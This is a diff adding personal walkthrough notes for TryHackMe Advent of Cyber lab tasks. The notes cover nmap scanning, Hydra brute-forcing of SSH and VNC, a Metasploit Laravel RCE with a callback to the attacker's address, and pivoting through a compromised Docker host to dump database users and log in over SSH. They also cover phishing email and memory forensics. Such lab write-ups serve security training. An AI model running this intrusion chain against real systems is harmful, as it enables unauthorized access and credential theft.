@@ -134,3 +134,308 @@ Victim might exposed sourcecode on github.
 1. Check https://who.is/whois/santagift.shop
 2. Clone repo on https://github.com/muhammadthm/SantaGiftShop and answer all the questions. 
 
+# Task #9 [Day 4] Scanning Scanning through the snow
+You can scan a network with nmap:
+
+* TCP SYN Scan. Return a list of live hosts and ports. Stealthy because it doesnt complete theTCP threewayhandshake ```nmap -sS MACHINE_IP```
+* Ping Scan. ```nmap -sn MACHINE_IP```
+* Operating System Scan. Gets the type of OS: ```nmap -O MACHINE_IP```
+* Detecting Services. Returns running services of the host: ```nmap -sV MACHINE_IP```
+
+Ports:
+There are 0 - 65'536 Ports. They can be in: 
+* Closed Ports: The host is not listening to the specific port.
+* Open Ports: The host actively accepts a connection on the specific port.
+* Filtered Ports: This indicates that the port is open; however, the host is not accepting connections or accepting connections as per certain criteria like specific source IP address.
+
+You can scan a website for vulnerabilities. 
+Run: ```nikto -host MACHINE_IP```
+
+Pros are using: Nessus and Acunetix to identify loopholes in a system.
+
+
+## Question
+### What is running on the remote host?
+![smbClient](/assets/images/tryhackme/Task-9-nmap.PNG)
+```nmap -sV 10.10.154.0```
+
+### What flag can you find after successfully accessing the Samba service?
+Connect to SMB service on 10.10.85.223
+
+![smbClient](/assets/images/tryhackme/Task-9-smb.PNG)
+
+List shares:
+```smbclient -L //10.10.85.223```
+
+Open interactive shell
+```smbclient "\\\10.10.85.223\admins" -U ubuntu%S@nta2022```
+$ ls
+$ cd
+$ get
+
+### What is the password for the username santahr?
+![smbClient](/assets/images/tryhackme/Task-9-smb-interactive.PNG)
+
+
+# Task 10 [Day 5] Brute-Forcing He knows when you're awake
+
+We are going to dictionary attack an account. 
+
+First scan the target via ```nmap -sS 10.10.93.183``` -sS = TCP SYN Scan technique
+![hydra -f](/assets/images/tryhackme/day5/nmap.PNG)
+
+THC Hydra is am commandline tool which understands SSH, VNC, FTP, POP*, IMAP, SMTP and others. 
+
+We run the command: ```hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://10.10.93.183 -V```
+This will find us the password for ssh user alexander. 
+
+Next task is to find a VNC password on the target. As VNC doesn't use username we omit it: 
+```hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.93.183 -V```
+This took quite long. 
+Somehow it didn't stop after it found a password. 
+I run again with ```hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.93.183 -f``` which should explicit stop after the first match.
+
+![hydra -f](/assets/images/tryhackme/day5/hydra-f.PNG)
+
+Eventually I could vnc login with Remmina into the target. 
+
+# Task 11 [Day 6] Email Analysis It's beginning to look a lot like phishing
+
+## OSINT
+Using https://emailrep.io tells you something about a sender address reputation. ("From" and "Return-Path")
+
+| Tool              | 	Purpose | 
+| ------------------| ----------| 
+| VirusTotal        | A service that provides a cloud-based detection toolset and sandbox environment.| 
+| InQuest           | A service provides network and file analysis by using threat analytics. (https://labs.inquest.net/)| 
+| IPinfo.io         | A service that provides detailed information about an IP address by focusing on geolocation data and service provider.| 
+| Talos Reputation  | An IP reputation check service is provided by Cisco Talos.| 
+| Urlscan.io        | A service that analyses websites by simulating regular user behaviour.| 
+| Browserling       | A browser sandbox is used to test suspicious/malicious links.| 
+| Wannabrowser      | A browser sandbox is used to test suspicious/malicious links.| 
+
+
+By running ```emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all``` we can extract the attachment without opening it. 
+
+With ```sha256sum``` we calculate the checksum of the attachment to then search it on virusTotal: https://www.virustotal.com
+![hydra -f](/assets/images/tryhackme/day6/virustotal.PNG)
+
+and we can also check on https://labs.inquest.net/
+![hydra -f](/assets/images/tryhackme/day6/Inquest.PNG)
+ 
+# Task 12 [Day 7] CyberChef Maldocs roasting on an open fire 
+## CyberCheck
+Is a webapplication to analyze data files. 
+In this task we are going to analyze the attachment of previous Task. 
+
+There were several steps to finally extract the flag:  
+
+* Strings. (output only strings with minimum length of 258). It is obfuscated with "[_]" between every letter.
+* Find / Replace. (with regex("[\[\]_\n]") .It shows that we start a Powershell with a base64 encoded content
+* Drop bytes. (To output only the base64 encoded part)
+* From Base64. It show a powershell script
+* Decode Text. (UTF16LE) as powershell uses this encoding. 
+* Find / Replace. to clean a bit up by removin obfuscate patterns
+* Find / Replace. to replace simple strings we know the value (http)
+* Extract URLs (Outputs only urls)
+* Split (Split by @, as each url of suffixed with an @)
+* Defang URL (Makes the URLs invalid/ unclickable)
+ 
+# Task 13 [Day 8] Smart Contracts Last Christmas I gave you my ETH
+## Blockchain
+Simple explanation of a blockchain:  database to store information in a specified format and is shared among members of a network with no one entity in control.
+
+# Smart Contracts
+Are a lot of the time the backbone of DeFi (Decentralized Financial apps) to support cryptocurrency on a blockchain. 
+A smart contract is a program stored on a blockchain that runs when pre-determined conditions are met.
+
+## The Re-entrancy Attack
+When smartcontracts are not perfectly written and exceptions are not properly handled or allowing fallback functions while executing the main withdrawal function. 
+
+We load the two provided smartcontracts into Remix IDE.
+
+One contract acts as normal wallet. You can call deposit, withdraw, get balance. 
+The other contract implements a re-entrancy attack on a given wallet address. 
+
+[exploitable contract](/assets/images/tryhackme/day8/EtherStore.sol)
+[exploit](/assets/images/tryhackme/day8/Attack.sol)
+
+# Task 14 [Day 9] Pivoting Dock the halls 
+
+## Docker
+When there is a ```/.dockerenv``` in the root directory of the filesystem its a most probably a docker container. 
+
+## Metasploit 
+On Kali Metasploit is already installed: ```msfconsole```
+
+Common commands: 
+
+```           
+# To search for a module, use the ‘search’ command:
+msf6 > search laravel
+
+# Load a module with the ‘use’ command
+msf6 > use multi/php/ignition_laravel_debug_rce
+
+# view the information about the module, including the module options, description, CVE details, etc
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
+        
+```
+
+Within a module: 
+
+```           
+# View the available options to set
+show options
+
+# Set the target host and logging
+set rhost 10.10.57.242
+set verbose true
+
+# Set the payload listening address; this is the IP address of the host running Metasploit
+set lhost LISTEN_IP
+
+# show options again
+show options
+
+# Run or check the module
+check
+run
+
+```
+
+
+Metasploit has its own routing table which allows to rout traffic from your host to a metasploit session. 
+
+### Socks Proxy
+You can run a proxy within Metasploit and even on a compromised machine. 
+
+some commands like curl supports using a proxy like this: ```curl --proxy socks4a://localhost:9050 http://MACHINE_IP```
+And if the tool doesn't support it, you can use proxychains: ```roxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP```
+
+
+
+### Session
+After metasploit exploited a target it opens a session. A session can be upgraded to a meterpreter session.
+
+### Meterpreter 
+Is a payload which enables interactive access to a compromised computer. 
+
+## Network pivoting
+When you gained a entrypoint into a system you can run network scanning tools like nmap and arp to find additional machines which where not reachable previously.
+
+
+## Walkthrough
+
+Starting with nmap on the target: ```nmap -T4 -A -Pn 10.10.57.242``` gives us the open port 80 with apache behind it. 
+![nmap_start](/assets/images/tryhackme/day9/nmap.PNG)
+
+Seems like we can just open a website on port 80. This gives us the info that laravel is used. 
+![laravel](/assets/images/tryhackme/day9/laravel.PNG)
+
+Run Metasploit: ```msfconsole```
+Run ```search laravel```
+Run ```use exploit/multi/php/ignition_laravel_debug_rce```
+
+![laravel](/assets/images/tryhackme/day9/metasploit.PNG)
+
+Within the module:
+Run ```show info```
+Run ```check RHOSTS=10.10.57.242 HttpClientTimeout=20```
+![laravel](/assets/images/tryhackme/day9/metasploit-Check.PNG)
+
+We need to check our own ip address by running ```ip addr``` in normal console. 
+![ip addr](/assets/images/tryhackme/day9/getmyownip.PNG)
+
+
+within the laravel module, lets run: ```un RHOSTS=10.10.57.242 LHOST=10.18.65.121 HttpClientTimeout=20```
+![metasploit run](/assets/images/tryhackme/day9/metasploit-run.PNG)
+
+Lets put the session into background and list all sessions: 
+![metasploit background](/assets/images/tryhackme/day9/metasploit-background.PNG)
+
+Now we upgrade the last session to meterpreter session: ```sessions -u -1``` and read an .env file
+![metasploit background](/assets/images/tryhackme/day9/meterpreter-getenv.PNG)
+
+we resolve the found webservice into IP address: ```resolve webservice_databse```
+This means there is another host on the network and we can pivoting to it. 
+![metasploit background](/assets/images/tryhackme/day9/anotherhost.PNG)
+
+We also see that we are in a docker container
+![In a docker container](/assets/images/tryhackme/day9/in-a-docker-container.PNG)
+
+Now we add a route on metasploit: ```route add 172.28.101.51/32 -1```
+We also add the route for the dockers default ip address to connect resources on its host: ```route add 172.17.0.1/32 -1```
+
+```   
+# Dump the schema
+use auxiliary/scanner/postgres/postgres_schemadump
+run postgres://postgres:postgres@172.28.101.51/postgres
+
+# Select information from a specific table
+use auxiliary/admin/postgres/postgres_sql
+run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
+```        
+![Schemadump](/assets/images/tryhackme/day9/schemadump.PNG)
+![SQL command](/assets/images/tryhackme/day9/sql-command.PNG)
+
+Now we can run something like this: ```curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v```
+The proxy will route this traffic to our target and the target will call its host machine. 
+
+We can now scan the targets host system: ```proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1```
+
+![nmap target host](/assets/images/tryhackme/day9/nmap-targets-host.PNG)
+We see that SSH port is open on the host machine.  
+
+Using the username and password we got from the database: ```run ssh://santa:p4$$w0rd@172.17.0.1```
+![nmap target host](/assets/images/tryhackme/day9/ssh-session.PNG)
+
+
+# Task 15 [Day 10] Hack a game You're a mean one, Mr. Yeti 
+Changing data in memory at runtime. 
+Cetus is a simple browser plugin that works for Firefox and Chrome, allowing you to explore the memory space of Web Assembly games that run in your browser.
+
+Its downloadable from here: https://github.com/Qwokka/Cetus/releases/download/v1.03.1/Cetus_v1.03.1.zip
+
+On firefox you can put ```about:debugging``` ->  ```This Firefox``` -> ```Load Temporary Add-on``` and select downloaded .zip file.
+ 
+The game lets you guess a number between 0 and 99999999  
+![guess numbers](/assets/images/tryhackme/day10/number-guessing.PNG)
+
+First I guessed and it was obviously wrong, but the guard tells you what it would have been: 81070266
+
+This number can be found with Cetus. The memory address can be bookmarked:
+![search in memory](/assets/images/tryhackme/day10/searched-bookmarked.PNG)
+
+We just try again and we see how the value changed in the bookmarked memory address:
+![read from bookmark](/assets/images/tryhackme/day10/read-from-bookmark.PNG)
+
+Next challenge is to cross some obstacles. 
+We can search the whole addressspace once. This will return 458753 results. 
+When we walk into the obstacle which will decrease our livepoints we search again for all values which decreased since last time.
+We repeat this until we see an address which could fit. We set this value to a high value and become imortal. 
+![imortal](/assets/images/tryhackme/day10/set-livepoint.PNG)
+
+# Task 16 [Day 10] Hack a game You're a mean one, Mr. Yeti 
+## Memory Forensics
+### Process
+At the simplest, a process is a running program.
+User Process -> A process which got started by a user.
+Background Process -> Processes launched automatically and managed by OS. 
+
+## Volatility 
+Is an open-source memory forensics toolkit written in Python. It can analyse memory dumps from Windos, Linux and Max OS. 
+Some features: 
+
+* List all processes that were running on the device at the time of the capture
+* List active and closed network connections
+* Use Yara rules to search for indicators of malware
+* Retrieve hashed passwords, clipboard contents, and contents of the command prompt
+
+If we don't know about the memory dump we can run: ```python3 vol.py -f workstation.vmem windows.info```
+To list all running processes at the time of dump: ```python3 vol.py -f workstation.vmem windows.pslist```
+To export specific binaries regarding a process: ```python3 vol.py -f workstation.vmem windows.dumpfiles --pid 4640```
+
+# Task 17 [Day 12] Malware Analysis Forensic McBlue to the REVscue!
+
+ 
